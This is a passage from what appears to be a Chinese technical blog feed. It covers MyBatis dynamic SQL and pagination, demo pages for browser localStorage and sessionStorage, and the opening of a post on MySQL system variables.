<p>①&#x3D;&#x3D;散装参数&#x3D;&#x3D;：需要使用@Param(“SQL中的参数占位符名称”)<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815163023.png"><br>②&#x3D;&#x3D;实体类封装参数&#x3D;&#x3D;：需要保证SQL中的参数名与实体类的属性名对应上<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815163023.png"><br>③&#x3D;&#x3D;Map集合&#x3D;&#x3D;需要保证SQL中的参数名与Map集合中的键的名称对应上<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815163023.png"></p>
</blockquote>
<h2 id="2、动态SQL"><a href="#2、动态SQL" class="headerlink" title="2、动态SQL"></a>2、动态SQL</h2><blockquote>
<p><strong>SQL语句随着用户输入或外部条件的变化而变化，我们称为动态&#x3D;&#x3D;SQL&#x3D;&#x3D;。</strong></p>
<ul>
<li>if</li>
<li>choose (when, otherwise)</li>
<li>trim (where, set)</li>
<li>foreach</li>
</ul>
</blockquote>
<hr>
<blockquote>
<p><strong>① if</strong><br>if 标签通常用于 WHERE 语句、UPDATE语句、INSERT语句，通过判断参数值来决定是否使用某个查询条件、判断是否更新或插入某一字段的值。<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815163023.png"></p>
</blockquote>
<hr>
<blockquote>
<p><strong>② choose</strong><br>有时候需求并不需要应用所有条件，而只是想从多选型中选择一个。Mybatis提供了<code>&lt;choose&gt;</code>标签（类似Java的switch），按顺序判断<code>&lt;when&gt;</code>标签（类似Java的case）中条件，若条件都不满足，执行<code>&lt;otherwise&gt;</code>标签（类似Java的default）的语句。<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815163024.png"></p>
</blockquote>
<hr>
<blockquote>
<p><strong>③trim</strong></p>
<ul>
<li>&#x3D;&#x3D;where&#x3D;&#x3D;<br>当 if 标签过多，以下组合可能会报错。<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815163024.png"><br>这是因为当<code>status</code>为null时，查询语句会出现<code>...where and ...</code>的情况。<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815163024.png"><br>解决方法可将 <code>where</code> 更改为 <code>where 1 = 1</code>，也可以利用<code>&lt;where&gt;</code>标签。<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815163024.png"></li>
<li>&#x3D;&#x3D;set&#x3D;&#x3D;<br>下面的组合中，当brandName为空时，也会报错。<br> <img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815163024.png"><br> 这是因为当<code>brandName</code>为null时，查询语句会出现<code>..., where ...</code>的情况。<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815163024.png"><br>解决方法可以利用<code>&lt;set&gt;</code>标签。<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815163024.png"></li>
</ul>
</blockquote>
<hr>
<blockquote>
<p><strong>④foreach标签</strong><br><code>&lt;foreach&gt;</code>标签主要用于构建<code>in</code>条件，可在sql语句中对集合进行迭代。也可用于批量删除、添加等操作中。<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815163024.png"><br>&#x3D;&#x3D;<strong>属性介绍</strong>&#x3D;&#x3D;</p>
<ul>
<li>collection：collection 属性的值有三个分别是 list、array、map 三种，分别对应的参数类型为：List、数组、map 集合。</li>
<li>item ：表示在迭代过程中每一个元素的别名</li>
<li>separator ：分隔符，表示迭代时每个元素之间以什么分隔</li>
<li>open ：前缀</li>
<li>close ：后缀</li>
<li>index ：表示在迭代过程中每次迭代到的位置（下标）</li>
</ul>
</blockquote>
<h2 id="3、添加数据主键返回"><a href="#3、添加数据主键返回" class="headerlink" title="3、添加数据主键返回"></a>3、添加数据主键返回</h2><blockquote>
<p><strong>在某些需求中，需要在数据添加成功后，获取插入数据库数据的&#x3D;&#x3D;主键&#x3D;&#x3D;的值。</strong><br>只需要在<code>&lt;insert&gt;</code>标签中添加两个数据即可。<code>useGeneratedKeys=&quot;true&quot; keyProperty=&quot;主键列名&quot;</code><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815163024.png"></p>
</blockquote>
<h1 id="六、其他"><a href="#六、其他" class="headerlink" title="六、其他"></a>六、其他</h1><h2 id="1、SqlSessionFactory工具类抽取"><a href="#1、SqlSessionFactory工具类抽取" class="headerlink" title="1、SqlSessionFactory工具类抽取"></a>1、SqlSessionFactory工具类抽取</h2><ul>
<li>创建<code>SqlSessionFactory</code>代码优化<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="comment">// 加载 mybatis核心配置文件，获取 SqlSessionFactory</span></span><br><span class="line"><span class="type">String</span> <span class="variable">resource</span> <span class="operator">=</span> <span class="string">&quot;mybatis-config.xml&quot;</span>;</span><br><span class="line"><span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Resources.getResourceAsStream(resource);</span><br><span class="line"><span class="type">SqlSessionFactory</span> <span class="variable">sqlSessionFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SqlSessionFactoryBuilder</span>().build(inputStream);</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li><strong>缺点及解决</strong>：</li>
</ul>
<ol>
<li>代码重复：<code>使用工具类</code></li>
<li>SqlSessionFactory工厂只创建一次，不能重复创建：<code>使用静态代码块</code></li>
</ol>
</blockquote>
</li>
</ul>
<p><strong>使用方法：<br>①定义获取SqlSessionFactory工具类</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SqlSessionFactoryUtils</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> SqlSessionFactory sqlSessionFactory;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="comment">// 静态代码块会随类的加载而自动执行，且只执行一次</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">resource</span> <span class="operator">=</span> <span class="string">&quot;mybatis-config.xml&quot;</span>;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Resources.getResourceAsStream(resource);</span><br><span class="line">            sqlSessionFactory = <span class="keyword">new</span> <span class="title class_">SqlSessionFactoryBuilder</span>().build(inputStream);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> SqlSessionFactory <span class="title function_">getSqlSessionFactory</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sqlSessionFactory;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>②获取SqlSessionFactory对象</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">SqlSessionFactory</span> <span class="variable">sqlSessionFactory</span> <span class="operator">=</span> SqlSessionFactoryUtils.getSqlSessionFactory();</span><br></pre></td></tr></table></figure>

<h2 id="2、分页插件"><a href="#2、分页插件" class="headerlink" title="2、分页插件"></a>2、分页插件</h2><p><strong>①引入maven依赖</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.github.pagehelper<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>pagehelper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>②加入plugin配置</strong><br>在mybatis核心配置文件中（mybatis-config.xml）配置PageHelper插件</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">plugin</span> <span class="attr">interceptor</span>=<span class="string">&quot;com.github.pagehelper.PageInterceptor&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>③代码</strong></p>
<ul>
<li>sql语句<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectByPage&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;Brand&quot;</span> &gt;</span></span><br><span class="line">	select * from tb_brand</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>java测试用例<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 加载 mybatis核心配置文件，获取 SqlSessionFactory</span></span><br><span class="line"><span class="type">String</span> <span class="variable">resource</span> <span class="operator">=</span> <span class="string">&quot;mybatis-config.xml&quot;</span>;</span><br><span class="line"><span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Resources.getResourceAsStream(resource);</span><br><span class="line"><span class="type">SqlSessionFactory</span> <span class="variable">sqlSessionFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SqlSessionFactoryBuilder</span>().build(inputStream);</span><br><span class="line"><span class="comment">// 获取SqlSession 对象， 执行 sql</span></span><br><span class="line"><span class="type">SqlSession</span> <span class="variable">sqlSession</span> <span class="operator">=</span> sqlSessionFactory.openSession();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置分页相关参数 当前页 + 每页显示的条数</span></span><br><span class="line">PageHelper.startPage(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">BrandMapper</span> <span class="variable">brandMapper</span> <span class="operator">=</span> sqlSession.getMapper(BrandMapper.class);</span><br><span class="line">List&lt;Brand&gt; brands = brandMapper.selectByPage();</span><br><span class="line">System.out.println(brands);</span><br><span class="line">sqlSession.close();</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>mybatis</tag>
      </tags>
  </entry>
  <entry>
    <title>浏览器本地存储</title>
    <url>/posts/5a112392.html</url>
    <content><![CDATA[<ul>
<li>浏览器的本地存储是指浏览器端通过<code>window.sessionStorage</code>和<code>window.localStorage</code>属性来进行浏览器的本地存储的。</li>
<li>一般能存5M左右的数据。</li>
</ul>
<p>说白了就是 8 个API的使用</p>
<ul>
<li><code>xxxStorage.setItem(&#39;key&#39;, &#39;value&#39;)</code>：该方法接受一个键和值作为参数，会把键值对添加到存储中，如果键名存在，则更新其对应的值</li>
<li><code>xxxStorage.getItem(&#39;key&#39;)</code>：该方法接受一个键名作为参数，返回键名对应的值</li>
<li><code>xxxStorage.removeItem(&#39;key&#39;)</code>：该方法接受一个键名作为参数，并把该键名从存储中删除</li>
<li><code>xxxStorage.clear()</code>：该方法会清空存储中的所有数据</li>
</ul>
<p>其中 <code>xxx</code> &#x3D; <code>local</code> 或者 <code>session</code>。</p>
<hr>
<p><strong>localStorage的使用</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>localStorage<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>localStorage的使用<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;saveDate()&quot;</span>&gt;</span>点我保存数据<span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;readDate()&quot;</span>&gt;</span>点我读数据<span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;deleteDate()&quot;</span>&gt;</span>点我删除数据<span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;deleteAllDate()&quot;</span>&gt;</span>点我清空数据<span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">let</span> person = &#123;<span class="attr">name</span>:<span class="string">&quot;划水艺术家&quot;</span>, <span class="attr">age</span>:<span class="number">20</span>&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 保存数据</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">function</span> <span class="title function_">saveDate</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&#x27;msg&#x27;</span>,<span class="string">&#x27;localStorage&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&#x27;person&#x27;</span>,<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(person))</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 读取数据</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">function</span> <span class="title function_">readDate</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">localStorage</span>.<span class="title function_">getItem</span>(<span class="string">&#x27;msg&#x27;</span>))</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> person = <span class="variable language_">localStorage</span>.<span class="title function_">getItem</span>(<span class="string">&#x27;person&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">parse</span>(person))</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 删除数据</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">function</span> <span class="title function_">deleteDate</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">localStorage</span>.<span class="title function_">removeItem</span>(<span class="string">&#x27;msg&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">localStorage</span>.<span class="title function_">removeItem</span>(<span class="string">&#x27;person&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 清空数据</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">function</span> <span class="title function_">deleteAllDate</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">localStorage</span>.<span class="title function_">clear</span>()</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><strong>sessionStorage的使用</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>sessionStorage<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>sessionStorage<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;saveDate()&quot;</span>&gt;</span>点我保存数据<span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;readDate()&quot;</span>&gt;</span>点我读数据<span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;deleteDate()&quot;</span>&gt;</span>点我删除数据<span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;deleteAllDate()&quot;</span>&gt;</span>点我清空数据<span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">let</span> person = &#123;<span class="attr">name</span>:<span class="string">&quot;划水艺术家&quot;</span>, <span class="attr">age</span>:<span class="number">20</span>&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 保存数据</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">function</span> <span class="title function_">saveDate</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">sessionStorage</span>.<span class="title function_">setItem</span>(<span class="string">&#x27;msg&#x27;</span>,<span class="string">&#x27;sessionStorage&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">sessionStorage</span>.<span class="title function_">setItem</span>(<span class="string">&#x27;person&#x27;</span>,<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(person))</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">  </span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 读取数据</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">function</span> <span class="title function_">readDate</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">sessionStorage</span>.<span class="title function_">getItem</span>(<span class="string">&#x27;msg&#x27;</span>))</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> person = <span class="variable language_">sessionStorage</span>.<span class="title function_">getItem</span>(<span class="string">&#x27;person&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">parse</span>(person))</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">  </span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 删除数据</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">function</span> <span class="title function_">deleteDate</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">sessionStorage</span>.<span class="title function_">removeItem</span>(<span class="string">&#x27;msg&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">sessionStorage</span>.<span class="title function_">removeItem</span>(<span class="string">&#x27;person&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">  </span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 清空数据</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">function</span> <span class="title function_">deleteAllDate</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">sessionStorage</span>.<span class="title function_">clear</span>()</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>


<p><strong>浏览器的本地存储可以在开发者工具中看到</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815145328.png" alt="  "></p>
<hr>
<blockquote>
<p><strong><code>sessionStorage</code>和<code>localStorage</code>的区别：</strong></p>
<ul>
<li>sessionStorage存储的内容会随着浏览器窗口关闭而消失</li>
<li>localStorage存储的内容保存在磁盘，需要手动清除才会消失</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>javascript</tag>
        <tag>html</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL-变量、流程控制与游标</title>
    <url>/posts/106f1f3a.html</url>
    <content><![CDATA[<h1 id="一、变量"><a href="#一、变量" class="headerlink" title="一、变量"></a>一、变量</h1><p>在MySQL数据库的存储过程和函数中，可以使用变量来存储查询或计算的中间结果数据，或者输出最终的结果数据。<br>在 MySQL 数据库中，变量分为 <strong>系统变量</strong> 以及 <strong>用户自定义变量</strong> 。</p>
<h2 id="1-系统变量"><a href="#1-系统变量" class="headerlink" title="1. 系统变量"></a>1. 系统变量</h2><h3 id="（1）系统变量分类"><a href="#（1）系统变量分类" class="headerlink" title="（1）系统变量分类"></a>（1）系统变量分类</h3><p>系统变量由系统定义，属于 <strong>服务器</strong> 层面。启动MySQL服务，生成MySQL服务实例期间，MySQL将为MySQL服务器内存中的系统变量赋值，这些系统变量定义了当前MySQL服务实例的属性、特征。这些系统变量的值要么是 <strong>编译MySQL时参数</strong> 的默认值，要么是 <strong>配置文件</strong> （例如<code>my.ini</code>等）中的参数值。</p>
<p>系统变量分为<strong>全局系统变量，需要添加 <code>GLOBAL</code> 关键字</strong>以及<strong>会话系统变量，需要添加 <code>SESSION</code> 关键字</strong>，有时也把全局系统变量简称为全局变量，有时也把会话系统变量称为local变量。<strong>如果不写，默认会话级别</strong>。</p>
<p>静态变量（在 MySQL 服务实例运行期间它们的值不能使用 set 动态修改）属于特殊的全局系统变量。</p>
<p>每一个MySQL客户机成功连接MySQL服务器后，都会产生<strong>与之对应的会话</strong>。会话期间，MySQL服务实例会在MySQL服务器内存中生成与该会话对应的会话系统变量，这些会话系统变量的初始值是全局系统变量值的<strong>复制</strong>。</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815134809.png" alt=" "></p>
<ul>
<li>全局系统变量针对于所有会话（连接）有效，但 <strong>不能跨重启</strong>（即 <strong>数据库重启</strong> 后，服务器又会从MySQL配置文件中读取变量的默认值。），但在MySQL8.0中提出了<strong>全局变量的持久化</strong>的新特性，这点待会也会提到。</li>
<li>会话系统变量仅针对于当前会话（连接）有效。会话期间，当前会话对某个会话系统变量值的修改，不会影响其他会话同一个会话系统变量的值。</li>
<li>会话1对某个全局系统变量值的修改会导致会话2中同一个全局系统变量值的修改。</li>
</ul>
<p>在MySQL中有些系统变量只能是全局的，例如 <code>max_connections</code> 用于限制服务器的最大连接数；有些系统变量作用域既可以是全局又可以是会话，例如 <code>character_set_client</code> 用于设置客户端的字符集；有些系统变量的作用域只能是当前会话，例如 <code>pseudo_thread_id</code> 用于标记当前会话的 MySQL 连接 ID。</p>
<h3 id="（2）查看系统变量"><a href="#（2）查看系统变量" class="headerlink" title="（2）查看系统变量"></a>（2）查看系统变量</h3><ul>
<li><strong>查看所有或部分系统变量</strong></li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 查看所有全局系统变量</span><br><span class="line"><span class="keyword">SHOW</span> <span class="keyword">GLOBAL</span> VARIABLES;</span><br><span class="line"></span><br><span class="line"># 查看所有会话系统变量</span><br><span class="line"><span class="keyword">SHOW</span> SESSION VARIABLES;</span><br><span class="line">或</span><br><span class="line"># 默认查询的是会话系统变量</span><br><span class="line"><span class="keyword">SHOW</span> VARIABLES;</span><br><span class="line"></span><br><span class="line"># 查看满足条件的部分全局系统变量</span><br><span class="line"><span class="keyword">SHOW</span> <span class="keyword">GLOBAL</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;%标识符%&#x27;</span>;</span><br><span class="line"># 查看满足条件的部分会话系统变量</span><br><span class="line"><span class="keyword">SHOW</span> SESSION VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;%标识符%&#x27;</span>;</span><br></pre></td></tr></table></figure>


<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">GLOBAL</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;admin_%&#x27;</span>;</span><br></pre></td></tr></table></figure>


<ul>
<li><strong>查看指定系统变量</strong></li>
</ul>
<p>MySQL 中的系统变量以 <strong>两个“@”</strong> 开头，其中<code>@@global</code>仅用于标记全局系统变<br>量，<code>@@session</code>仅用于标记会话系统变量。<code>@@</code>首先标记会话系统变量，如果会话系统变量不存在，则标记全局系统变量。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 查看指定的系统变量的值</span><br><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@global</span>.变量名;</span><br><span class="line"></span><br><span class="line"># 查看指定的会话变量的值</span><br><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@session</span>.变量名;</span><br><span class="line">或者</span><br><span class="line"><span class="keyword">SELECT</span> @@变量名;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>修改系统变量的值</strong></li>
</ul>
<p>有些时候，数据库管理员需要修改系统变量的默认值，以便修改当前会话或者MySQL服务实例的属性、特征。具体方法：</p>
<ol>
<li>修改MySQL 配置文件 ，继而修改MySQL系统变量的值（该方法需要重启MySQL服务）</li>
<li>在MySQL服务运行期间，使用<code>set</code>命令重新设置系统变量的值</li>
</ol>
